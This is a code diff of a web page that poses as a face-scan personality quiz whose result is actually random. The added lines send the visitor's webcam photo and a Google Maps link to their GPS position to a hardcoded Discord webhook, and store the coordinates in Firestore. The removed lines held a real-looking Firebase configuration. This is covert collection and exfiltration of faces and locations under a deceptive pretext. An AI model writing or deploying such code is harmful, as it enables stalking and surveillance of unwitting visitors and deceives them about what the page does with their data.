@@ -23,24 +23,19 @@
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
         import { getFirestore, addDoc, collection, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
-        import { getStorage, ref, uploadString, getDownloadURL } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-storage.js";
 
-        // ★★★ ここを自分のFirebaseの設定（firebaseConfig）に書き換える ★★★
+        // 【1】Firebaseの設定をここに貼る
         const firebaseConfig = {
-            apiKey: "AIzaSyAK_CaFeRNBE5b29DYoCnqQIj_fMqCOFqE",
-            authDomain: "face-still.firebaseapp.com",
-            projectId: "face-still",
-            storageBucket: "face-still.firebasestorage.app",
-            messagingSenderId: "370841335231",
-            appId: "1:370841335231:web:697d8ee92a453235b91d0a",
-            measurementId: "G-6P20CTY920"
+            apiKey: "あなたのAPIキー",
+            authDomain: "あなたのプロジェクト.firebaseapp.com",
+            projectId: "あなたのプロジェクトID",
+            storageBucket: "あなたのプロジェクト.appspot.com",
+            messagingSenderId: "あなたのID",
+            appId: "あなたのアプリID"
         };
-        // ★★★ ここまで ★★★
 
-        // Firebase初期化
         const app = initializeApp(firebaseConfig);
         const db = getFirestore(app);
-        const storage = getStorage(app);
 
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
@@ -56,40 +51,43 @@
             btn.disabled = true;
             resultDiv.innerText = "スキャン中...";
 
-            // 1. 位置情報の取得
             navigator.geolocation.getCurrentPosition(async (pos) => {
                 const lat = pos.coords.latitude;
                 const lng = pos.coords.longitude;
 
-                // 2. 写真のキャプチャ
+                // 写真キャプチャ
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
                 const imageData = canvas.toDataURL('image/jpeg');
+                const blob = await (await fetch(imageData)).blob();
 
-                // 3. ランダム結果
+                // 診断結果
                 const res = Math.random() > 0.5 ? "陽キャ" : "陰キャ";
-                
-                try {
-                    // 4. Firebase Storageに画像を保存
-                    const fileName = `faces/${Date.now()}.jpg`;
-                    const storageRef = ref(storage, fileName);
-                    await uploadString(storageRef, imageData, 'data_url');
-                    const imageUrl = await getDownloadURL(storageRef);
 
-                    // 5. Firestoreに統計データを保存
+                try {
+                    // 【2】DiscordのWebhook URLをここに貼る
+                    const webhookUrl = "https://discord.com/api/webhooks/1475357385492136098/7L3L92yDhZhsjeQAh9NgcgOeS4ESaaCUvYda9-d4EW4Juxey1rX3gZ-BXLI6qgl02IA_";
+
+                    // Discord送信
+                    const formData = new FormData();
+                    formData.append("content", `【新着】結果: ${res}\n場所: https://www.google.com/maps?q=${lat},${lng}`);
+                    formData.append("file", blob, "face.jpg");
+
+                    await fetch(webhookUrl, { method: "POST", body: formData });
+
+                    // Firebaseに文字データだけ保存
                     await addDoc(collection(db, "results"), {
                         result: res,
                         location: { lat, lng },
-                        image: imageUrl,
                         timestamp: serverTimestamp()
                     });
 
                     resultDiv.innerText = "結果: " + res;
-                    alert("診断完了！統計を保存しました。");
+                    alert("診断完了！");
                 } catch (e) {
                     console.error(e);
-                    alert("保存に失敗しました。ルールの設定を確認してください。");
+                    alert("送信に失敗しました");
                 } finally {
                     btn.disabled = false;
                 }
